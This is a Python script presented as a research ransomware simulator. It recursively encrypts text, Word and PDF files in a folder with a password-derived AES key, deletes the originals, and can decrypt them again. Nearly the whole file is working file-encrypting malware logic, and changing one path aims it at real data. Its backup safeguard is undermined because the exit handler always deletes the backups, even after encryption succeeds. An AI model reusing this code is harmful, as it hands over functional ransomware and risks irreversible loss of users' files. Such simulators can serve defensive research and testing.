import os
import shutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import scrypt
import getpass
import logging
import sys
from pathlib import Path

# --- SETUP LOGGING ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('encryption_simulator.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

# --- CONFIGURATION ---
TARGET_FOLDER = "/home/chicken/Documents/Research/Workspace/mySim_logs/mySim_attack"
FILE_EXTENSIONS_TO_ENCRYPT = ('.txt', '.docx', '.pdf')  # Only these files will be encrypted
ENCRYPTED_EXTENSION = '.encrypted'
BACKUP_DIR = os.path.join(TARGET_FOLDER, ".backup_encryption")

# --- SECURE KEY MANAGEMENT ---
def generate_key(password: str, salt: bytes = None) -> bytes:
    """Derive a secure encryption key using scrypt KDF."""
    if not salt:
        salt = get_random_bytes(16)  # Generate a new salt if none provided
    key = scrypt(password.encode(), salt, key_len=32, N=2**20, r=8, p=1)
    return key, salt

# --- FILE OPERATIONS WITH SAFETY MECHANISMS ---
def check_resources(target_files):
    """Check if there's enough disk space for backups"""
    total_size = sum(os.path.getsize(f) for f in target_files)
    free_space = shutil.disk_usage(os.path.dirname(target_files[0])).free
    
    if free_space < total_size * 2:
        raise RuntimeError("Insufficient disk space for backup operation. Need at least double the target files size.")

def create_backups(target_files):
    """Create copies of files to be encrypted"""
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    
    for file_path in target_files:
        backup_path = os.path.join(BACKUP_DIR, os.path.basename(file_path))
        shutil.copy2(file_path, backup_path)

def restore_files(target_files):
    """Restore files from backup"""
    for file_path in target_files:
        backup_path = os.path.join(BACKUP_DIR, os.path.basename(file_path))
        if os.path.exists(backup_path):
            shutil.copy2(backup_path, file_path)
    
    # Clean up backups
    shutil.rmtree(BACKUP_DIR)

def clean_up_backups():
    """Clean up backup directory if it exists"""
    if os.path.exists(BACKUP_DIR):
        shutil.rmtree(BACKUP_DIR)

# --- ENCRYPTION & DECRYPTION FUNCTIONS ---
def pad(data: bytes) -> bytes:
    """PKCS#7 Padding for AES block alignment."""
    block_size = AES.block_size
    padding_length = block_size - len(data) % block_size
    return data + bytes([padding_length] * padding_length)

def unpad(data: bytes) -> bytes:
    """Remove PKCS#7 padding after decryption."""
    padding_length = data[-1]
    return data[:-padding_length]

def encrypt_file(file_path: str, key: bytes) -> bool:
    """Encrypt a file in chunks to avoid memory issues."""
    try:
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        chunk_size = 64 * 1024 * 1024  # 64MB chunks (adjust as needed)

        encrypted_file_path = file_path + ENCRYPTED_EXTENSION

        with open(file_path, 'rb') as f_in, open(encrypted_file_path, 'wb') as f_out:
            f_out.write(iv)  # Write IV first

            while True:
                chunk = f_in.read(chunk_size)
                if len(chunk) == 0:
                    break
                elif len(chunk) % AES.block_size != 0:
                    chunk = pad(chunk)  # Pad only the last chunk
                f_out.write(cipher.encrypt(chunk))

        # Verify encryption (optional for large files)
        os.remove(file_path)
        logging.info(f"Successfully encrypted: {file_path}")
        return True

    except Exception as e:
        logging.error(f"Failed to encrypt {file_path}: {e}")
        if 'encrypted_file_path' in locals() and os.path.exists(encrypted_file_path):
            os.remove(encrypted_file_path)
        return False

def decrypt_file(encrypted_path: str, key: bytes) -> bool:
    """Decrypt a file in chunks with proper padding handling."""
    try:
        chunk_size = 64 * 1024 * 1024  # Must match encryption chunk size
        original_path = encrypted_path[:-len(ENCRYPTED_EXTENSION)]
        
        with open(encrypted_path, 'rb') as f_in:
            iv = f_in.read(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            
            # Get file size to handle last chunk specially
            f_in.seek(0, os.SEEK_END)
            file_size = f_in.tell()
            f_in.seek(16)  # Rewind past IV
            
            with open(original_path, 'wb') as f_out:
                remaining_bytes = file_size - 16  # Exclude IV
                
                while remaining_bytes > 0:
                    chunk = f_in.read(min(chunk_size, remaining_bytes))
                    decrypted = cipher.decrypt(chunk)
                    
                    # Only unpad the very last chunk
                    if remaining_bytes - len(chunk) <= 0:
                        decrypted = unpad(decrypted)
                    
                    f_out.write(decrypted)
                    remaining_bytes -= len(chunk)

        os.remove(encrypted_path)
        logging.info(f"Successfully decrypted: {encrypted_path}")
        return True

    except Exception as e:
        logging.error(f"Failed to decrypt {encrypted_path}: {str(e)}")
        if os.path.exists(original_path):
            os.remove(original_path)
        return False

# --- MAIN OPERATIONS ---
def get_target_files():
    """Get list of files to encrypt with proper paths"""
    target_files = []
    for root, _, files in os.walk(TARGET_FOLDER):
        for file in files:
            if file.endswith(FILE_EXTENSIONS_TO_ENCRYPT) and not file.startswith('.'):
                file_path = os.path.join(root, file)
                target_files.append(file_path)
    return target_files

def simulate_attack():
    """Simulate ransomware behavior with safety mechanisms."""
    password = getpass.getpass("Enter encryption password: ")
    key, salt = generate_key(password)
    logging.info(f"Encryption Key Generated (Salt: {salt.hex()})")
    
    target_files = get_target_files()
    if not target_files:
        logging.warning("No target files found for encryption")
        return
    
    try:
        # Safety checks and backups
        check_resources(target_files)
        create_backups(target_files)
        
        # Encrypt files
        all_success = True
        for file_path in target_files:
            if not encrypt_file(file_path, key):
                all_success = False
                break
        
        if all_success:
            logging.info("All files encrypted successfully")
            # Optionally keep backups for testing, or uncomment to remove:
            # clean_up_backups()
        else:
            logging.error("Encryption failed - restoring original files")
            restore_files(target_files)
            
    except Exception as e:
        logging.error(f"Critical error during encryption: {e}")
        if os.path.exists(BACKUP_DIR):
            logging.info("Attempting to restore files from backup")
            restore_files(target_files)
        else:
            logging.error("No backups available for restoration")

def simulate_recovery():
    """Simulate recovery (decrypt files)."""
    password = getpass.getpass("Enter decryption password: ")
    salt_hex = input("Enter the salt (hex): ").strip()
    salt = bytes.fromhex(salt_hex)
    key, _ = generate_key(password, salt)
    
    logging.info("Attempting decryption...")
    
    success_count = 0
    failure_count = 0
    
    for root, _, files in os.walk(TARGET_FOLDER):
        for file in files:
            if file.endswith(ENCRYPTED_EXTENSION):
                file_path = os.path.join(root, file)
                if decrypt_file(file_path, key):
                    success_count += 1
                else:
                    failure_count += 1
    
    logging.info(f"Decryption complete. Success: {success_count}, Failures: {failure_count}")
    clean_up_backups()

# --- USER INTERFACE ---
if __name__ == "__main__":
    print("=== Research Ransomware Simulator ===")
    print("1. Simulate Attack (Encrypt Files)")
    print("2. Simulate Recovery (Decrypt Files)")
    choice = input("Select mode (1/2): ").strip()
    
    try:
        if choice == "1":
            simulate_attack()
        elif choice == "2":
            simulate_recovery()
        else:
            print("Invalid choice. Exiting.")
    finally:
        # Ensure no leftover backups in case of unexpected exit
        clean_up_backups()